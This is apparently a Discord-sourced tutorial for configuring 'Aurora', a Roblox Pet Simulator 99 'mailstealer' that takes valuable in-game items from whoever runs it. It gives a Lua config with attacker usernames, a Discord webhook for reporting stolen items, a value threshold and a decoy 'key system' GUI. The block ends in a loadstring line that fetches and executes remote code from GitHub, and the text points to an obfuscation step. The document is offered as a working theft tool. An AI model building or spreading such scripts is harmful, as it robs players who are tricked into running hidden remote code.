# I had made a tutorial for my mailstealer (for pet simulator99) [Aurora](https://discord.gg/Eh7EX6dzAF) feel free to join my server, do not run anything you see here you will lose your stuf!!! this is a direct copy and paste of my tutorial from the discord
# part 1 (no pictures)
Alright chat this is a tutorial  
Since everyone's stupid and can't understand lua 😭  
And I don't have the resources to host a 24/7 mailsteal creator bot So here's a tutorial So I'll be explaining most of the shit  
# 1 getting your webhook
video tutorial below:  
[https://cdn.discordapp.com/attachments/1237042070829400106/1237846977559920741/20240508-1920-20.3780950.mp4?ex=66465cd5&is=66450b55&hm=1e8a596b3fcefdd6da155e84d0c807db23da9daecd25f1cb15cb2a66836b6939&](https://cdn.discordapp.com/attachments/1237042070829400106/1237846977559920741/20240508-1920-20.3780950.mp4?ex=66465cd5&is=66450b55&hm=1e8a596b3fcefdd6da155e84d0c807db23da9daecd25f1cb15cb2a66836b6939&)   
From my [partner<3](https://discord.gg/CxhY6rpUCA)
# 2: setting up the lua code

Get the script from ⁠[script channel from discord](https://discord.com/channels/1226830019939143690/1227851051634266193)
It should look like this:
```
Username = "your user here"
Username2 = "your 2nd user here" -- stuff will get sent to this user if first user's mailbox is full
Webhook = "your webhook here"
min_rap = 500000 -- minimum rap of each item you want to get sent to you.

keySystemEnabled = true -- wether you want to enable key system or not
hubName = "Hubname | Keysystem" -- self explain
keyLink = "https://example.com/" -- the link wehere yoi cam get your keys this can be a discord invite
keys = {"key1", "key2", "andsoon"} -- the keys for your key system

loadstring(game:HttpGet('https://raw.githubusercontent.com/Enivzoy/Utilz/main/lua/rblx/AuroraTils/mainframe'))()
```
Now I will update the script more  
So don't copy the script from here incase a major rewrite/bugs go join the [discord](https://discord.gg/Eh7EX6dzAF) for updated script  
So as per [update 4.6/keysystem1.2](https://discord.com/channels/1226830019939143690/1227851051634266193/1240374560046714910) the script is updated   
Make sure you have a ps99 account which can receive mail, Aka must have reached area 10. It's better to use a alt account (or 2 alt accounts incase you get banned)  
So the `Username` should be your username for like the account to receive the mail  
For example `Username = "GetAuroraMS"`  
Now here's the tricky part  
If you have an alt  
You need to fill in the `Username2` also  
If you happen to have your mains mailbox full it will send to username2  
Now if this value(Username2) is kept empty/removed then it'll be set to my ign(only if the value is empty or removed completely) to avoid errors(no this isn't dualhooking, it's a failsafe)  
~~If I'm nice I might return the items~~  
Now the webhook, You should've gotten the webhook from step 1 So put it to the `Webhook` value  
For example `Webhook = "discord.com/x/x`  
  
Now minimum rap, Minimum rap means the item has to be the same or above the rap you put into the script   
  
Now let's say you have min rap to about 1m, And you hit a guy with 500k
You won't get anything because the min rap is 1m  
Now minrap is calculated based on whole numbers(no "m" or "k" if it's 6k then it should be 6000 if it's 1m then it should be 1000000)  
So if your into the high stuff  
Set your min rap to 1-3m  
# key system (ohh boi this gon be hard to explain(i think so?))  
So key system is like a gui that opens when you run the script  
You can enable this (it's enabled by default) by setting the `keySystemEnabled` value to true  
If you dont want key system  
Just set it to false `keySystemEnabled = false`  
Or remove everything related to it (keySystemEnabled, hubName, keyLink, keys !!!!DO NOT TOUCH THE LOADSTRING!!!!)  
I think you can figure rest of the stuff out  
now after doing everything you save your script to a file call it mailsetaler.txt and save it somewhere(using notepad or a file editor) then go to step 3(part2)  
Make sure to [DM](https://discord.gg/Eh7EX6dzAF) me if you cant follow something  I'll help you   
# part 2(with pictures covering obfuscation & uploading to github is in README2.md
